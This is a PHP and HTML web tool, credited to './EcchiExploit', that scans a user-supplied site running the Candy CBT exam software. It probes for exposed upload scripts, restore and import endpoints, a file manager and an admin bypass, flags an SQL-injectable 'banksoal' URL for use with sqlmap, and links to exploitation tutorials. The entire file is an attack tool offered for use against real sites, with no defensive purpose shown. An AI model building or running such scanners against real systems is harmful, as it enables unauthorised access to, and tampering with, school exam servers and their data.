<!DOCTYPE html>
<html>
<head>
	<title>Candy Cbt Exploit</title>
	<meta charset="utf-8">
	<meta name="author" content="./EcchiExploit">
	<meta name="description" content="Scanning Exploit In Candy CBT">
</head>
<body>
	<h1>Candy CBT Exploit Scanner</h1>
	<form method="POST">
		Site => <input type="text" name="url" placeholder="https://example.com">
		<input type="submit" value="Scann!!">
	</form>
</body>
</html>
<?php
function curl($url){
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($curl, CURLOPT_HEADER, true);
	$exe = curl_exec($curl);
	$info = curl_getinfo($curl, CURLINFO_HTTP_CODE);
	curl_close($curl);
	return $info;
}
if (isset($_POST['url']) && !empty($_POST['url'])) {
	$filter = htmlspecialchars($_POST['url']);
	if(!preg_match('#^http(s)?://#',$filter)){
		$web = "http://".$filter;
	}
	else {
		$web = $filter;
	}
	$exp5 = $web."/admin/?pg=uplsiswa";
	$exp6 = $web."/x-panel/?pg=banksoal&ac=lihat&id=990";
	$exploit = array('/plugins/uploadfile/demo/uploads/demo.html', '/plugins/uploadfile/demo/uploads/upload.php','/admin/filesoal.php','/admin/restore.php','/admin/soal/import_file.php','/admin/ifm.php');
	if (curl($web."/admin/login.php") == "200") {
		foreach ($exploit as $key) {
			$site = $web.$key;
			if (curl($site) == "200") {
				echo "Found : <a href='$site' target='_blank'>$site</a><br>";
			}
			else {
				echo "Not Found : $site<br>";
			}
		}
		if (curl($exp5) == "302") {
			echo "Vuln : <a href='$exp5' target='_blank'>$exp5</a><br>";
		}
		else {
			echo "Not Vuln : $exp5";
		}
		echo "<br>Tutorial Exploit : <a href='https://ecchiexploit.blogspot.com/search?q=candy+cbt' target='_blank'>Klick Here</a>";
	}
	else {
		if(curl($exp6) == "302"){
			echo "Sql Injection With Sqlmap : <a href='$exp6' target='_blank'>$exp6</a><br>";
			echo "Tutorial : <a href='https://ecchiexploit.blogspot.com/2020/09/sql-injection-in-new-candy-cbt-v28-rev.html' target='_blank'> Klick Here </a>";
		}
		else {
			echo "Not Injection : $exp6";
		}
	}
}
?>